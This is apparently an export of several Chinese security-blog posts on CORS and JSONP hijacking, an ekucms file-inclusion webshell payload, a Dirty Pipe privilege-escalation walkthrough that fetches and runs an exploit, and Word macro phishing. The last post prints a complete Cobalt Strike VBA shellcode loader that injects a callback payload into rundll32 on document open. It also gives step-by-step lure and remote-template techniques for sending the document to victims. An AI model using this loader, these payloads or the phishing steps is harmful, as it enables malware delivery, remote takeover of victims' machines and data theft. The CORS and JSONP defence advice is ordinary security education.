Access-Control-Allow-Origin: http://api.bob.comContent-Type: text/html; charset=utf-8 ④ 总结 具体流程如上图所示，当构造请求包的方法是 PUT 或 DELETE 并传给浏览器时，浏览器发现此请求是非简单请求所以浏览器构造一个预检请求包，请求头是 OPTIONS，并携带三个关键字段：Origin、Access-Control-Request-Method、Access-Control-Request-Headers。其中 Access-Control-Request-Method 表示浏览器的 CORS 请求会用到哪些HTTP方法， Access-Control-Request-Headers 表示浏览器 CORS 请求会额外发送的头信息字段。服务器收到预检请求后，检查了三个核心字段以后如果确定允许跨域请求，会返回一个正常的 HTTP 回应，并携带传入的 CORS 头信息。如果服务器否定请求，虽然也会返回一个正常的 HTTP 回应但是没有任何 CORS 相关的头信息字段，或明确表示请求不符合条件。浏览器根据预请求的返回结果决定接下来是进行简单请求还是拒绝请求。 2、攻击流程CORS 使用检查请求头的相关字段和服务端的规则进行对比，来选择是否允许跨域。但凡是需要配置规则的程序，避免不了会出现一些意外，就像很多资深程序员有时也会写不出恰当的正则一样，当服务端配置的规则不够合理，导致非同域的资源可以互相访问，例如Access-Control-Allow-Origin: *。 CORS 反而使同源策略的保护机制土崩瓦解。因此，CORS 漏洞的成因很明显，就是服务端配置的规则不当所导致的。 CORS 跨域漏洞的攻击流程如上图所示： 假设用户登陆一个含有 CORS 配置网站 vuln.com，同时又访问了攻击者提供的一个链接 evil.com。 evil.com 的网站向 vuln.com 这个网站发起请求获取敏感数据，浏览器能否接收信息取决于 vuln.com 的配置。 如果 vuln.com 配置了 Access-Control-Allow-Origin 头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。 3、漏洞验证这是一个正常的GET请求包 其正常响应包为 我们现在在该请求包上面添加一个origin参数 返回包的数据中出现了对应的 CORS 响应头： 其中Access-Control-Allow-Origin指是允许访问的源，Access-Control-Allow-Credentials指的是允许带上 cookie 访问资源，这样我们就可以通过 POST 获取到访问者的 cookie 信息。 4、靶场实例以 BWAPP 靶场 Low 级别的 CORS 漏洞环境作为演示案例 点击 secret 跳转到如下页面，藏着 Neo 的秘密： 现在攻击者的目的是盗取该页面里面的 sercet 密码内容，查看请求这个页面时的HTTP响应头，从Access-Control-Allow-Origin：* 头可以看出服务器配置了 CORS，且所有的源服务器都可以加载这个页面上的资源： 攻击者可以直接发送一个自己构造的页面链接给用户，当用户点击后，攻击页面使用 ajax 就可以直接读取另一个 BWAPP 靶场网站的目标网页敏感信息，攻击页面 test.html 源码如下： &lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; window.onload = function()&#123; var xhr =new XMLHttpRequest();// 创建AJAX的对象 // 设置使用的请求方式 xhr.open(&#x27;get&#x27;,&#x27;http://127.0.0.1/bwAPP2.2/bwAPP/secret-cors-1.php&#x27;,true); xhr.send(); // 发送请求 xhr.onreadystatechange=function()&#123; if(xhr.readyState === 4 )&#123; // 状态 4 表示服务器已响应 // 判断正常的响应结果的状态码 if(xhr.status &gt;=200 &amp;&amp; xhr.status&lt;300 || xhr.status === 304)&#123; console.log(xhr.responseText); // 获取响应体内容 &#125;else&#123; console.log(&#x27;0&#x27;); &#125; &#125; &#125; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 此处将该页面放在本地 PhpStudy 搭建的服务下，并在浏览器进行访问，将成功跨域发送资源请求并返回想要的敏感信息（控制台打印）： 或者直接使用eval目录下的attack-cors.htm，修改目标服务器路径即可 5、检测方法如何在平常测试中检查 CORS 跨域漏洞？ CORS 漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。 一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。 首先是自动在 HTTP 请求包中加上 Origin 的头部字段，打开BurpSuite，选择 Proxy 模块中的 Options 选项，找到 Match and Replace 这一栏，勾选 Request header 将空替换为 Origin:foo.example.org 的Enable框： 然后我们就可以开始去访问我们认为有漏洞的网站，访问足够多后在 BurpSuite 的 Proxy 模块下的 HTTP history 来筛选带有 CORS 头部的值： 我们的条件可以是如下： Access-Control-Allow-Origin: foo.example.orgAccess-Control-Allow-Credentials: true 检测效果如下： 【注意】这里要注意的是，我们也可以测试下带有 CORS 字段的网站是否有 CORS 漏洞，如果服务器响应包的请求头是以下几种情况则可存在 CORS 漏洞： 实锤存在： 有且仅有如下请求头： Access-Control-Allow-Origin: * 实锤存在：同时存在如下两个请求头 Access-Control-Allow-Origin: https://attacker.comAccess-Control-Allow-Credentials: true 可能存在：同时存在如下两个请求头 Access-Control-Allow-Origin: nullAccess-Control-Allow-Credentials: true 但是如果是如下组合，则绝对没有漏洞，因为该配置下浏览器会自动阻止： Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true 6、结合XSS有时候 CORS 配置了信任自身的任意子域，那么如果一个子域存在 XSS 漏洞就可以通过这个漏洞去读取其他子域的资源，类似的场景还有比如 HTTPS 域信任 HTTP 域等。 7、漏洞扫描可以使用 Xray 联动 BurpSuite 进行扫描，如下是 Xray 扫出来的一次 CORS： 同时 github上 提供了一个关于扫描 CORS 配置漏洞的脚本，https://github.com/chenjj/CORScanner。 root@kali:~/Desktop/CORScanner# python cors_scan.py -husage: cors_scan.py [-h] [-u URL] [-i INPUT] [-t THREADS] [-o OUTPUT] [-v [VERBOSE]] [-d [HEADERS [HEADERS ...]]] OPTIONS: -h, --help show this help message and exit -u URL, --url URL URL/domain to check it&#x27;s CORS policy -i INPUT, --input INPUT URL/domain list file to check their CORS policy -t THREADS, --threads THREADS Number of threads to use for CORS scan -o OUTPUT, --output OUTPUT Save the results to text file -v [VERBOSE], --verbose [VERBOSE] Enable Verbosity and display results in realtime -d [HEADERS [HEADERS ...]], --headers [HEADERS [HEADERS ...]] Add headers to the request. Example: python cors_scan.py -u google.com 我们将检测的域名写在一个记事本里，然后使用-i参数去进行批量扫描。 8、防护方案 关闭不必要开启的CORS； 白名单限制：定义“源”的白名单，避免使用正则表达式，不要配置 Access-Control-Allow-Origin 为通配符 * 或 null ，严格效验来自请求数据包中的 Origin 的值； 仅允许使用安全协议，避免中间人攻击； 尽可能的返回 Vary: Origin 头部，以避免攻击者利用浏览器缓存进行攻击； 避免将 Access-Control-Allow-Credentials 标头设置为默认值 true ，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 false； 限制跨域请求允许的方法，Access-Control-Allow-Methods 最大限度地减少所涉及的方法，降低风险； 限制浏览器缓存期限：建议通过 Access-Control-Allow-Methods 和 Access-Control-Allow-Headers 头部，限制浏览器缓存信息的时间。通过配置 Access-Control-Max-Age 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值，确保浏览器在短时间内可以更新策略； 仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。 三、JSONP劫持JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案，它是 json 的一种“使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。 JSONP 实现的基本原理是利用了 HTML 里 &lt;script&gt;&lt;/script&gt; 元素标签，远程调用 JSON 文件来实现数据传递。当某网站通过 JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。 1、利用过程 用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息； 用户通过浏览器向网站A发出URL请求； 网站A向用户返回响应页面，响应页面中注册了 JavaScript 的回调函数和向网站B请求的 script 标签，示例代码如下： &lt;script type=&quot;text/javascript&quot;&gt;function Callback(result)&#123; alert(result.name);&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt; 用户收到响应，解析 JS 代码，将回调函数作为参数向网站B发出请求； 网站 B 接收到请求后，解析请求的 URL，以 JSON 格式生成请求需要的数据，将封装的包含用户信息的 JSON 数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下： Callback(&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;&#125;) 网站B数据返回后，浏览器则自动执行 Callback 函数对步骤4返回的 JSON 格式数据进行处理，通过 alert 弹窗展示了用户在网站B的注册信息。另外也可将 JSON 数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。 2、靶场实例下面以 DoraBox 靶场的 JSONP 劫持漏洞为演示案例： 访问 JSONP 靶场环境页面： 其服务端源码如下： &lt;!-- jsonp.php --&gt;&lt;?php include &quot;../class/function.class.php&quot;; $reqMethod = &quot;GET&quot;; $reqValue = &quot;callback&quot;; $p = new Func($reqMethod, $reqValue); $info = array(&#x27;username&#x27; =&gt; &#x27;Vulkey_Chen&#x27;, &#x27;mobilephone&#x27; =&gt; &#x27;13188888888&#x27;, &#x27;email&#x27; =&gt; &#x27;admin@gh0st.cn&#x27;, &#x27;address&#x27; =&gt; &#x27;中华人民共和国&#x27;, &#x27;**&#x27; =&gt; &#x27;Cool Man&#x27;); if(!@$_GET[&#x27;callback&#x27;])&#123; echo $p -&gt; con_function(&#x27;json_encode&#x27;,$info); &#125;else&#123; $callback = htmlspecialchars($_GET[&#x27;callback&#x27;]); echo &quot;&#123;$callback&#125;(&quot; . $p -&gt; con_function(&#x27;json_encode&#x27;,$info) . &quot;)&quot;; &#125;?&gt; 重点关注： if(!@$_GET[&#x27;callback&#x27;])&#123; echo $p -&gt; con_function(&#x27;json_encode&#x27;,$info);&#125;else&#123; $callback = htmlspecialchars($_GET[&#x27;callback&#x27;]); echo &quot;&#123;$callback&#125;(&quot; . $p -&gt; con_function(&#x27;json_encode&#x27;,$info) . &quot;)&quot;; &#125; 这里首先以 get 形式接收到 callback 的值，如果 callback 为空，则忽略警告输出 info 的 json 格式数据： 如果 callback 值不为空，则对这个值做一个过滤后输出，然后后面还是输出 json 格式的 info 的值： 从这段代码我们可以看到，callback 的值是可以动态输出的，如果我们现在拿到了一个以jsonp 方式传输用户认证后数据的网站，我们就可以构造出一个恶意的 jsonp 调用页面，然后诱使用户访问我们的页面，从而达到一个截取用户信息的目的。 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;JSONP劫持测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;function test(result) &#123; alert(result.mobilephone); &#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/DoraBox-master/csrf/jsonp.php?callback=test&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 将上面的 jsonp_attack.html 页面放在本地 phpstudy 搭建的服务网站根目录下，浏览器进行访问，成功获得敏感信息（手机号码）： 3、漏洞挖掘 搜索引擎 Hacking 语法——site:target.com inurl:?callback 浏览器-调试-搜索关键字（json/jsonp/callback）： 4、JSONP漏洞利用技巧JSONP 漏洞主要被攻击者用来在受害者不知不觉中窃取他们的隐私数据，常常被一些 APT 组织采用进行信息收集和钓鱼的工作( 水坑攻击 )，下面的一个例子就可以说是在模拟水坑攻击 当我们发现信息泄露的 jsonp 接口以后我们要做的就是在自己的网站上写一个脚本，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会想这个接口请求用户的敏感数据，并传送到攻击者的服务器上 $.ajax(&#123; url: &#x27;https://api.weibo.com/2/&#123;隐藏了哦&#125;&#x27;, type: &#x27;get&#x27;, dataType: &#x27;jsonp&#x27;,&#125;).done(function(json)&#123; var id = json[&quot;data&quot;][&quot;id&quot;]; var screen_name = json[&quot;data&quot;][&quot;screen_name&quot;]; var profile_image_url = json[&quot;data&quot;][&quot;profile_image_url&quot;]; var post_data = &quot;&quot;; post_data += &quot;id=&quot; + id + &quot;&amp;&quot;; post_data += &quot;screen_name=&quot; + screen_name + &quot;&amp;&quot;; post_data += &quot;profile_image_url=&quot; + encodeURIComponent(profile_image_url); console.log(post_data); // 发送到我的服务器上&#125;).fail(function() &#123;&#125;); 既然是窃取敏感信息，那么敏感信息除了一些 email 手机号 用户名等还有什么呢？没错，甚至可以是 CSRF Token 信息，有时候在 CSRF token 获取不到但是又找不到 XSS 的攻击点的时候不妨考虑一下 jsonp 劫持。 5、漏洞危害JSONP是一种敏感信息泄露的漏洞，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站， 网站中包含其他网站的JSONP漏洞利用代码 ，将链接通过邮件等形式推送给受害人， 如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息， 这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。 6、防护方案 严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。 严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。 严格过滤 callback 函数名及 JSON 里数据的输出。 严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。 其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。 四、CORS与JSONP的比较CORS与JSONP的使用目的相同，但是比JSONP更强大。 JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。 五、参考链接 https://blog.csdn.net/weixin_39190897/article/details/113769462 https://www.cnblogs.com/happystudyhuan/p/11583384.html https://ruanyifeng.com/blog/2016/04/cors.html","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"CSRF","slug":"CSRF","permalink":"https://wolke.cn/tags/CSRF/"}],"author":"w01ke"},{"title":"易酷ekucms本地文件包含漏洞","slug":"易酷ekucms本地文件包含漏洞","date":"2022-03-09T04:57:30.000Z","updated":"2022-10-23T13:56:51.301Z","comments":true,"path":"post/28755b24.html","link":"","permalink":"https://wolke.cn/post/28755b24.html","excerpt":"","text":"一、简介易酷CMS是一套专为不同需求的站长而设计的视频点播系统，灵活，方便是最大的特色，为初学者快速架设网站首选，只需5分钟即可建立一个海量的视频讯息的行业网站。 易酷CMS采用PHP+MYSQL架构 二、漏洞影响范围ekucms &lt;= 2.5 三、测试环境 PHP 5.3.21 MySQL 5.7.26 ekucms 2.4.1 四、复现下载地址：链接：https://pan.baidu.com/s/1TkJgH7WFHLb781NO_2Ysag 提取码：nfzt 安装完成后如图所示 访问URL：http://localhost/ekucms2.4.1/?s=my/show/id/&#123;~eval($_POST[x])&#125;，报错 报错信息记录到了日志，日志目录：/ekucms/temp/Logs/ 文件包含日志路径：http://localhost/ekucms2.4.1/?s=my/show/id//../temp/logs/22_03_08.log POST：x=phpinfo();","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CMS","slug":"CMS","permalink":"https://wolke.cn/tags/CMS/"}],"author":"w01ke"},{"title":"CVE-2022-0847 Linux脏管内核提权漏洞复现","slug":"CVE-2022-0847-Linux内核提权漏洞复现","date":"2022-03-09T02:47:13.000Z","updated":"2022-03-10T11:01:13.825Z","comments":true,"path":"post/77a28503.html","link":"","permalink":"https://wolke.cn/post/77a28503.html","excerpt":"","text":"一、CVE-2022-0847简介危害等级：高 POC/EXP情况：已公开（https://www.exploit-db.com/exploits/50808） 影响范围：Linux内核5.8及以后的版本（注：该漏洞已在Linux 5.16.11、5.15.25 和 5.10.102 中修复） 二、漏洞描述CVE-2022-0847是自 5.8 以来 Linux 内核中的一个漏洞，攻击者利用该漏洞可以覆盖任意只读文件中的数据。这样将普通的权限提升至root权限，因为非特权进程可以将代码注入到根进程。 CVE-2022-0847类似于 CVE-2016-5195 “Dirty Cow”（脏牛提权），而且容易被利用，网页翻译过来叫脏管道。 三、复现【方法一：使用DirtyPipe.sh】 git clone https://github.com/imfiver/CVE-2022-0847cd CVE-2022-0847id # 查看当前用户id,确定为普通用户，需要提升权限uname -a # 查看当前内核版本，5.10.0大于等于5.8符合本次漏洞利用前提bash ./Dirty-Pipe.sh 【方法二：使用dirtypipez.c】 mkdir dirtypipezcd dirtypipezwget https://haxx.in/files/dirtypipez.cgcc dirtypipez.c -o dirtypipez 这个POC需要事先找到一个具有SUID权限的可执行文件，然后利用这个文件进行提权。使用以下命令可以找到这类文件 find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -print 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 这里就以/usr/bin/su为例，直接./dirtypipez跟上具有SUID权限的文件即可提权 ./dirtypipez /usr/bin/su 四、漏洞修复更新升级Linux内核到以下安全版本 Linux内核 &gt;= 5.16.11 Linux内核 &gt;= 5.15.25 Linux内核 &gt;= 5.10.102 五、参考链接 https://mp.weixin.qq.com/s/6VebZCKAv6kkmQme4GCQ_w","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://wolke.cn/tags/CVE/"},{"name":"提权","slug":"提权","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"}],"author":"w01ke"},{"title":"Word宏钓鱼","slug":"Word宏钓鱼","date":"2022-03-08T07:16:05.000Z","updated":"2022-03-08T08:45:15.220Z","comments":true,"path":"post/42739bea.html","link":"","permalink":"https://wolke.cn/post/42739bea.html","excerpt":"","text":"一、本地加载恶意Word文档/模板文件上线CS1、生成监听器 2、使用CobaltStrike生成宏木马选择MS Office宏 选择监听器 提示了使用步骤 Copy Marco代码如下 Private Type PROCESS_INFORMATION hProcess As Long hThread As Long dwProcessId As Long dwThreadId As LongEnd TypePrivate Type STARTUPINFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Long hStdInput As Long hStdOutput As Long hStdError As LongEnd Type#If VBA7 Then Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#Else Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#End IfSub Auto_Open() Dim myByte As Long, myArray As Variant, offset As Long Dim pInfo As PROCESS_INFORMATION Dim sInfo As STARTUPINFO Dim sNull As String Dim sProc As String#If VBA7 Then Dim rwxpage As LongPtr, res As LongPtr#Else Dim rwxpage As Long, res As Long#End If myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _-1,-1,47,98,99,81,70,0,110,-60,-16,-88,-109,73,115,86,-74,-83,-24,-104,-51,92,8,108,-99,-3,104,125,92,121,-36,32,109,72,-18,-112,2,43,-91,-8, _51,17,123,-44,17,-12,125,-79,-88,29,78,32,-93,-47,-20,84,17,77,-33,28,-27,-109,66,30,125,92,-55,119,104,4,-77,-79,108,78,-2,-21,5,42,120,-23, _-106,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,87,79,87,54,52,59,32,84,114,105,100,101,110,116,47, _53,46,48,59,32,70,117,110,87,101,98,80,114,111,100,117,99,116,115,41,13,10,0,-78,-71,-108,93,108,47,-34,39,-99,-23,53,2,70,-89,-117,45,-125, _-34,-108,-21,11,95,84,18,-45,-114,94,1,51,-3,-75,-99,-37,109,-52,31,-88,24,41,81,-80,14,114,-3,2,105,25,105,30,-15,-13,34,-68,-72,-55,87,-19, _61,-24,-82,25,-116,107,-104,119,6,124,-37,-17,103,-54,-24,-49,38,10,96,86,55,-88,-95,6,93,43,-93,28,-124,-54,-75,-9,21,28,-72,-98,86,51,84,-89, _-3,78,103,91,-88,-72,-11,-36,-82,-80,-61,-11,106,-18,100,-92,15,-100,-41,-24,110,63,38,38,104,-108,-80,-127,-61,-77,-98,35,101,-53,-40,51,-109,42,93,-20, _52,14,71,82,84,-20,121,89,-6,1,-117,-82,13,80,57,-21,121,46,75,38,-6,5,-31,-97,-82,21,-13,-106,-45,11,-5,-51,112,13,5,-40,90,-61,-94,-79, _48,118,-54,85,-75,-121,36,104,-74,4,-12,73,116,-21,5,-24,-47,95,70,-108,-61,-54,-22,97,118,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,46,52,46,49,51,46,49,50,52,0,25,105,-96,-115) If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then sProc = Environ(&quot;windir&quot;) &amp; &quot;\\\\SysWOW64\\\\rundll32.exe&quot; Else sProc = Environ(&quot;windir&quot;) &amp; &quot;\\\\System32\\\\rundll32.exe&quot; End If res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo) rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40) For offset = LBound(myArray) To UBound(myArray) myByte = myArray(offset) res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;) Next offset res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)End SubSub AutoOpen() Auto_OpenEnd SubSub Workbook_Open() Auto_OpenEnd Sub 3、创建启用恶意宏的Word文档/模板创建一个Word，视图-查看宏 宏名随便输入一个就可以，创建 在Project项目中的ThisDocument中添加CS生成的宏代码，并且右上角选择Auto_Open，在对方打开文档时，Word自动运行宏提示信息，提示是否点击 Ctrl + S保存 选择使用启用宏的文档/模板，这里我启用宏的word文档和启用宏的模板都弄一个 保存后报毒了，因为未做任何免杀，继续 4、加载恶意宏文件以下动图展示了目标机打开Word文档且启用宏时，反弹shell 以下动图展示了目标机右键打开Word模板时，反弹shell 双击是无法打开模版文件的，在模版文件上双击默认是以此模版创建新文件，切记。 本地加载的缺点就是，会被杀软查杀 二、远程加载恶意Word模板文件上线CS利用Word文档加载附加模板时的缺陷所发起的恶意请求而达到的攻击目的，所以当目标用户点开攻击者发给他的恶意word文档就可以通过向远程服务器请求恶意模板并执行恶意模板上的恶意代码。 这里，我们借助CobaltStrike生成office宏病毒，在将恶意宏嵌入到Word模板中，诱使受害者远程打开并加载带有宏的恶意Word模版，至目标主机成功上线CobaltStrike。 缺点：目标主机的网速决定了加载远程模版的速度。有可能文件打开的会特别慢(例如将远程模版放在github)，受害者可能在文件打开一半的时候强制关闭word。加载位于github上的恶意模板内容，有点慢，我们可以放在vps上，这样速度就快些了。 优点：因为是远程加载，所以免杀效果十分不错。基本不会被杀毒软件拦截。 1、将恶意模板文件上传到服务器将之前制作的含有恶意代码的模板文件上传到服务器上（我这里以kali开启HTTP服务为例） 2、构造恶意的docx钓鱼文件打开word找一个任意的模板使用 这里我就通过录制宏，另存为1.dotm模板文件到Office模板目录下，自己制作一个模板 直接继续在开始一栏新建–导入之前做好的模板文件1.dotm，保存为嘿嘿.docx 将后缀名改为zip 解压缩 进入word文件夹中的_rels，找到settings.xml.rels文件，编辑这个文件，将其的target属性的值改为服务器的URL http://ip:port/获奖名单.dotm?raw=true或者http://域名/获奖名单.dotm?raw=true 完成后，将刚才解压生成的文件再压缩回去 并且将生成的文件改名为后缀名为docx的文件 这里利用的是分离免杀的方法，里面的代码都是正常的，由于杀毒软件是静态查杀，所以无法查杀的！ 3、加载服务器上的恶意文件反弹shell将最终生成的恶意文件——嘿嘿.docx用邮箱钓鱼、qq或微信文件发送给受害者，当受害者双击打开“嘿嘿.docx”文件，启用宏时，恶意代码会执行，目标主机会上线 4、进阶伪装–背景虚拟化图片的覆盖从刚刚的实验可以知道，启动word后，还需要用户点击启用宏，稍有戒备心的就不会开启，因此我们需要再做一些钓鱼工作 以下内容来自公众号Gamma实验室的内容，链接已在参考链接给出。暂时不对此进行复现，了解有这种骚操作即可。 在网上随便找个模板，复制黏贴进去，截图另存为 打开我们的神器，美图秀秀，打开我们刚截图的图片，点击背景虚拟化，调整虚拟化程度，最好是那种弱影弱现的感觉最nice，然后加上一些说明嗷 然后设置图片尺寸为790，1120 然后保存，然后就可以看到效果了 为什么会设置成790x1120嘞，只是为了刚好覆盖word里面的文本，然后docx文档另存为doc文档 然后打开，去开启显示开发者工具选项卡，文件-&gt;选项-&gt;自定义功能区-&gt;主选项卡-&gt;开发者工具 然后点击开发者工具，选择图像（Active控件） 设置图像格式为浮于文字上方，并把图像拉满 效果就是这样，会把文字全部覆盖 然后点击图像属性，设置成我们做好的图片，然后点击宏创建宏，cs生成宏木马 复制粘贴，在Auto_Open（）函数首部编写代码，设置图片位置为0高度为0让宏运行后doc上图片消失，然后保存，office马就制作好了 Project.ThisDocument.Image1.Top = 0Project.ThisDocument.Image1.Width = 0 成品展示： 三、其他思路如果是遇到WPS的客户怎么办？通过上面的方法WPS打开我的简历是不会提示宏的 其他思路： 打开WPS创建宏是暗色的需要安装VBA for WPS才可以写WPS宏病毒代码执行！ 